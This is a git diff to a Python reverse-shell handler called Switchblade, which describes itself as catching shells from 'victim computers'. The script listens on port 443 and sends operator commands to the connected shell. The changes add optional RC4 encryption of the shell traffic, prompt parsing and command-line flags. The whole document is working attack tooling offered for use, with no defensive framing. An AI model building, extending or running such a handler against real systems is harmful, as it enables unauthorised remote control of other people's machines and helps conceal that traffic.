@@ -18,7 +18,14 @@ import nclib
 from nclib.errors import NetcatError, NetcatTimeout
 
 import re
-ansi_escape = re.compile(r'\x1b[^m]*m') # re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
+ansi_escape = re.compile('\x1b[^m\x07]*[m\x07]') # re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
+#ansi_escape = #re.compile("[\x9b\x1b][\]\[]?[0-?]*[ -\/]*[@-~]")#re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
+
+def toBytes(string):
+    if type(string) is str:
+        return string.encode()
+    else:
+        return string
 
 ###############################
 ######## RC4 Setup ############
@@ -56,13 +63,15 @@ def rc4(msg):
 
 class Switchblade:
     
-    def __init__(self, port=443, sendLog=None, recvLog=None):
-        self.port = port
-        self.sendLog = sendLog
-        self.recvLog = recvLog
+    def __init__(self, args): #port=443, sendLog=None, recvLog=None):
+        self.port = args.port
+        self.sendLog = args.send_log
+        self.recvLog = args.recv_log
+        self.do_encrypt = args.encrypt
         self.nc = nclib.Netcat(listen=('0.0.0.0',self.port), log_send=self.sendLog, log_recv=self.recvLog)
         self.assume_prompt = True
         self.prompt_str = ""
+        self.prompt_suffix = "" # last 2 characters of the prompt, usually "# "
         print("Victim connected!")
 
     def setPromptStr(self, prompt):
@@ -95,8 +104,10 @@ class Switchblade:
                 msg = self.nc.recv()  #.decode()
                 if not msg:
                     raise NetcatError
-                
-                msg = self.decrypt(msg)
+                msg = toBytes(msg)
+                #print(msg)
+                if self.do_encrypt: 
+                    msg = self.decrypt(msg)
                 # Keep the data binary, just print a text representation to the screen
                 #print("Received {} chars".format(len(msg)))
                 msg_str = msg.decode(errors="ignore")
@@ -105,23 +116,22 @@ class Switchblade:
                 if self.assume_prompt:
                     #print("Spliting message")
                     split = msg_str.rsplit("\n", 1)
-                    #print(split)
-                    #if len(split) > 1:
-                    #    print("Using: {}".format( split[1]))
-                    self.setPromptStr(split[-1])
-                    # If there isn't actually a prompt, this is very, very dangerous
-                    if len(split) > 1:
-                        msg_str = split[0]
-                    else:
-                        # we set it to the prompt_str already. Not safe, but okay
-                        msg_str = ""
-                print(msg_str)
+                    if not self.prompt_suffix or split[-1].endswith(self.prompt_suffix):
+                        self.prompt_suffix = split[-1][-2:]
+                        self.setPromptStr(split[-1])
+                        # If there isn't actually a prompt, this is very, very dangerous
+                        if len(split) > 1:
+                            msg_str = split[0]
+                        else:
+                            # we set it to the prompt_str already. Not safe, but okay
+                            msg_str = ""
+                print(msg_str, end="")
             except (socket.error, NetcatError):
                 print("recv machine broke.")
-
     def send(self,cmd):
-        cmd = cmd+'\n'
-        cmd = self.encrypt(cmd)
+        cmd = toBytes(cmd+'\n')
+        if self.do_encrypt:
+            cmd = self.encrypt(cmd)
         #self.nc.send(str.encode(cmd))
         #print("Sending {} chars".format(len(cmd)))
         self.nc.send(cmd)
@@ -146,7 +156,7 @@ class Switchblade:
                                 time.sleep(1)
                                 if self.prompt_str:
                                     break
-                    cmd = self.session.prompt(self.prompt_str)
+                    cmd = self.session.prompt(str(self.prompt_str))
                     if cmd == "bye netcat":
                         break
                     preface = cmd.split(':')[0]
@@ -162,9 +172,10 @@ class Switchblade:
 
 if __name__=="__main__":
     parser=argparse.ArgumentParser(description='A smart handler to catch reverse shells from victim computers.')
-    parser.add_argument('-p', default=443, type=int, required=False, help="The port on which switchblade will listen")
+    parser.add_argument('-p', '--port', default=443, type=int, required=False, help="The port on which switchblade will listen")
+    parser.add_argument('-e', '--encrypt', action="store_true", help="Do encryption (rc4)")
     parser.add_argument('--send-log', type=str, required=False, help="A filepath to log connection information about output")
     parser.add_argument('--recv-log', type=str, required=False, help="A filepath to log information about input")
-    args = parser.parse_args(sys.argv[1:])
-    sb = Switchblade(args.p,args.send_log,args.recv_log)
+    args = parser.parse_args()
+    sb = Switchblade(args) #(args.p,args.send_log,args.recv_log)
     sb.listener()
